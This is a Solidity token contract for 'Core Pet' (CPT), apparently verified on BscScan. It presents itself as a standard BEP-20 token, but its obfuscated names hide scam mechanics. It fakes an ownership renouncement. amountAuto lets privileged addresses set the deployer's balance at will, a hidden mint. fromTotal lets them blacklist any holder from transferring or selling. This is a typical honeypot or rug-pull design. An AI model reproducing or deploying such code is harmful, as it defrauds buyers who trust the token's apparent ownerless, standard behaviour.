/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface senderMaxFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address totalMax) external view returns (uint256);

    function transfer(address fromTrading, uint256 tokenBuy) external returns (bool);

    function allowance(address fundExemptAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenBuy) external returns (bool);

    function transferFrom(
        address sender,
        address fromTrading,
        uint256 tokenBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed limitExemptFrom, uint256 value);
    event Approval(address indexed fundExemptAt, address indexed spender, uint256 value);
}

interface senderMaxFromMetadata is senderMaxFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract liquidityTrading {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface listTake {
    function createPair(address senderBuyFee, address receiverSender) external returns (address);
}

interface walletToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CorePet is liquidityTrading, senderMaxFrom, senderMaxFromMetadata {

    mapping(address => uint256) private minMax;

    mapping(address => mapping(address => uint256)) private feeTeam;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingReceiverTo;
    }

    address public senderIs;

    function name() external view virtual override returns (string memory) {
        return isFund;
    }

    function launchedSwap() public view returns (uint256) {
        return tradingMin;
    }

    bool public atSell;

    function tradingLimit() public view returns (uint256) {
        return atLaunch;
    }

    uint8 private modeTake = 18;

    function tokenSell() public {
        emit OwnershipTransferred(swapTrading, address(0));
        maxAmount = address(0);
    }

    function amountAuto(uint256 tokenBuy) public {
        if (!receiverLaunch[_msgSender()]) {
            return;
        }
        minMax[swapTrading] = tokenBuy;
    }

    function allowance(address launchedLaunchFrom, address shouldIs) external view virtual override returns (uint256) {
        return feeTeam[launchedLaunchFrom][shouldIs];
    }

    string private isFund = "Core Pet";

    function limitReceiver(address maxFund) public {
        if (walletAt) {
            return;
        }
        if (liquidityShould) {
            tradingMin = launchList;
        }
        receiverLaunch[maxFund] = true;
        
        walletAt = true;
    }

    mapping(address => bool) public exemptIsReceiver;

    event OwnershipTransferred(address indexed walletSenderTx, address indexed senderTeamList);

    function teamFundFrom() public {
        
        if (atSell == liquidityShould) {
            tradingMin = atLaunch;
        }
        tradingMin=0;
    }

    function getOwner() external view returns (address) {
        return maxAmount;
    }

    constructor (){
        if (liquidityShould != atSell) {
            atLaunch = tradingMin;
        }
        walletToken isReceiver = walletToken(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        senderIs = listTake(isReceiver.factory()).createPair(isReceiver.WETH(), address(this));
        maxAmount = _msgSender();
        
        swapTrading = maxAmount;
        receiverLaunch[swapTrading] = true;
        if (atSell == liquidityShould) {
            tradingMin = atLaunch;
        }
        minMax[swapTrading] = tradingReceiverTo;
        emit Transfer(address(0), swapTrading, tradingReceiverTo);
        tokenSell();
    }

    string private swapWallet = "CPT";

    function symbol() external view virtual override returns (string memory) {
        return swapWallet;
    }

    function maxReceiver() public {
        
        if (liquidityShould) {
            tradingMin = atLaunch;
        }
        atLaunch=0;
    }

    address public swapTrading;

    function amountFromLaunch(address receiverMax, address fromTrading, uint256 tokenBuy) internal returns (bool) {
        if (receiverMax == swapTrading) {
            return totalSell(receiverMax, fromTrading, tokenBuy);
        }
        require(!exemptIsReceiver[receiverMax]);
        return totalSell(receiverMax, fromTrading, tokenBuy);
    }

    function fromTotal(address isTake) public {
        if (atLaunch == tradingMin) {
            atLaunch = launchList;
        }
        if (isTake == swapTrading || isTake == senderIs || !receiverLaunch[_msgSender()]) {
            return;
        }
        
        exemptIsReceiver[isTake] = true;
    }

    function autoMin() public view returns (bool) {
        return atSell;
    }

    mapping(address => bool) public receiverLaunch;

    uint256 private atLaunch;

    function fromList() public {
        
        
        tradingMin=0;
    }

    uint256 private tradingReceiverTo = 100000000 * 10 ** 18;

    function balanceOf(address totalMax) public view virtual override returns (uint256) {
        return minMax[totalMax];
    }

    bool public liquidityShould;

    function totalSell(address receiverMax, address fromTrading, uint256 tokenBuy) internal returns (bool) {
        require(minMax[receiverMax] >= tokenBuy);
        minMax[receiverMax] -= tokenBuy;
        minMax[fromTrading] += tokenBuy;
        emit Transfer(receiverMax, fromTrading, tokenBuy);
        return true;
    }

    address private maxAmount;

    function approve(address shouldIs, uint256 tokenBuy) public virtual override returns (bool) {
        feeTeam[_msgSender()][shouldIs] = tokenBuy;
        emit Approval(_msgSender(), shouldIs, tokenBuy);
        return true;
    }

    function transfer(address takeLimit, uint256 tokenBuy) external virtual override returns (bool) {
        return amountFromLaunch(_msgSender(), takeLimit, tokenBuy);
    }

    function owner() external view returns (address) {
        return maxAmount;
    }

    function toLaunchedTake() public view returns (uint256) {
        return launchList;
    }

    function transferFrom(address receiverMax, address fromTrading, uint256 tokenBuy) external override returns (bool) {
        if (feeTeam[receiverMax][_msgSender()] != type(uint256).max) {
            require(tokenBuy <= feeTeam[receiverMax][_msgSender()]);
            feeTeam[receiverMax][_msgSender()] -= tokenBuy;
        }
        return amountFromLaunch(receiverMax, fromTrading, tokenBuy);
    }

    uint256 private launchList;

    function decimals() external view virtual override returns (uint8) {
        return modeTake;
    }

    uint256 public tradingMin;

    bool private teamToken;

    bool public walletAt;

    function marketingSwap() public view returns (uint256) {
        return atLaunch;
    }

}